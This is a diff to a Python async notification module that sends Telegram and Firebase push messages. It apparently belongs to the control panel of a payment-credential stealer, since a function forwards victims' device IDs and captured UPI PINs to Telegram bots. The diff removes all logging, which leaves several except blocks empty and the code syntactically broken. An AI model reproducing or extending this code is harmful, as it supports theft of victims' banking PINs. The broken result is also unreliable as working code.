@@ -1,9 +1,6 @@
 import asyncio
-import logging
 from typing import Optional, Dict, Any
 from datetime import datetime
-
-logger = logging.getLogger(__name__)
 
 class BackgroundTaskManager:
     
@@ -20,10 +17,9 @@ class BackgroundTaskManager:
         try:
             method = getattr(service, method_name)
             await method(*args, **kwargs)
-            logger.debug(f"? Telegram notification sent: {method_name}")
+
         except Exception as e:
-            logger.warning(f"??  Failed to send Telegram notification: {e}")
-    
+
     async def send_push_notification(
         self,
         service,
@@ -34,10 +30,10 @@ class BackgroundTaskManager:
         try:
             method = getattr(service, method_name)
             result = await method(*args, **kwargs)
-            logger.debug(f"? Push notification sent: {method_name}")
+
             return result
         except Exception as e:
-            logger.warning(f"??  Failed to send push notification: {e}")
+
             return None
     
     async def log_activity(
@@ -48,9 +44,8 @@ class BackgroundTaskManager:
     ):
         try:
             await service.log_activity(*args, **kwargs)
-            logger.debug(f"? Activity logged")
+
         except Exception as e:
-            logger.warning(f"??  Failed to log activity: {e}")
 
 background_tasks = BackgroundTaskManager()
 
@@ -67,7 +62,6 @@ async def send_telegram_in_background(
             bot_index=bot_index
         )
     except Exception as e:
-        logger.warning(f"Background telegram failed: {e}")
 
 async def send_push_in_background(
     firebase_service,
@@ -84,7 +78,6 @@ async def send_push_in_background(
             data or {}
         )
     except Exception as e:
-        logger.warning(f"Background push failed: {e}")
 
 async def notify_device_registration_bg(
     telegram_service,
@@ -110,11 +103,8 @@ async def notify_device_registration_bg(
             app_type=app_type,
             model=model
         )
-        
-        logger.debug(f"? Device registration notifications sent for {device_id}")
-        
+
     except Exception as e:
-        logger.warning(f"Background device registration notification failed: {e}")
 
 async def notify_upi_detected_bg(
     telegram_service,
@@ -137,11 +127,8 @@ async def notify_upi_detected_bg(
             upi_pin=upi_pin,
             model=model
         )
-        
-        logger.debug(f"? UPI detection notifications sent for {device_id}")
-        
+
     except Exception as e:
-        logger.warning(f"Background UPI notification failed: {e}")
 
 async def notify_admin_login_bg(
     telegram_service,
@@ -155,9 +142,8 @@ async def notify_admin_login_bg(
             ip_address=ip_address,
             success=success
         )
-        logger.debug(f"? Admin login notification sent for {admin_username}")
+
     except Exception as e:
-        logger.warning(f"Background admin login notification failed: {e}")
 
 async def notify_admin_logout_bg(
     telegram_service,
@@ -169,9 +155,8 @@ async def notify_admin_logout_bg(
             admin_username=admin_username,
             ip_address=ip_address
         )
-        logger.debug(f"? Admin logout notification sent for {admin_username}")
+
     except Exception as e:
-        logger.warning(f"Background admin logout notification failed: {e}")
 
 async def send_2fa_code_bg(
     telegram_service,
@@ -187,9 +172,8 @@ async def send_2fa_code_bg(
             code=code,
             message_prefix=message_prefix
         )
-        logger.debug(f"? 2FA code sent for {admin_username}")
+
     except Exception as e:
-        logger.warning(f"Background 2FA notification failed: {e}")
 
 async def send_multiple_notifications_bg(
     telegram_service,
@@ -210,6 +194,3 @@ async def send_multiple_notifications_bg(
     
     for i, result in enumerate(results):
         if isinstance(result, Exception):
-            logger.warning(f"Notification {i} failed: {result}")
-    
-    logger.debug(f"? Batch notifications sent: {len(notifications)}")
